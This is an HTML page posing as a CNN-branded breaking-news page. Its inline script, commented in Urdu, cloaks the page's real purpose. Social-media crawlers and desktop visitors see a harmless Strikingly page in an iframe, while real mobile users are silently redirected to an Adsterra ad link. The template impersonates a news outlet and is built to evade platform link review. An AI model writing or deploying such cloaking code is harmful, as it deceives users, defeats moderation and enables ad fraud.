
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Latest News Updates</title>
    
    <meta property="og:title" content="Breaking News: Major Global Events Today" />
    <meta property="og:description" content="Stay updated with the latest headlines and world events." />
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/b/b1/CNN.svg" />

    <script>
        function runTrafficManager() {
            var ua = navigator.userAgent.toLowerCase();
            var isMobile = /android|iphone|ipad|ipod/i.test(ua);
            
            // بوٹ چیک (Facebook, Google, etc.)
            var isBot = ua.includes("facebookexternalhit") || 
                        ua.includes("facebot") || 
                        ua.includes("googlebot") || 
                        ua.includes("bot") || 
                        ua.includes("crawler");

            if (isMobile && !isBot) {
                // اصلی موبائل یوزر کے لیے آپ کا ایڈسٹرا لنک
                setTimeout(function() {
                    window.location.href = "YOUR_ADSTERRA_DIRECT_LINK_HERE";
                }, 800); 
            } else {
                // بوٹس اور کمپیوٹر کے لیے آپ کا اسٹرائیکنگلی لینڈنگ پیج
                document.getElementById("safe-view").style.display = "block";
                document.getElementById("loading").style.display = "none";
            }
        }
        window.onload = runTrafficManager;
    </script>
</head>
<body style="margin:0; padding:0; overflow:hidden; background-color:#fff;">

    <div id="safe-view" style="display:none;">
        <iframe src="https://genteel-platypus-t08hrw.mystrikingly.com/" 
                style="width:100%; height:100vh; border:none;"></iframe>
    </div>

    <div id="loading" style="text-align:center; padding-top:200px; font-family:sans-serif;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/CNN.svg" width="100">
        <p>Loading the latest news feed...</p>
    </div>

</body>
</html>
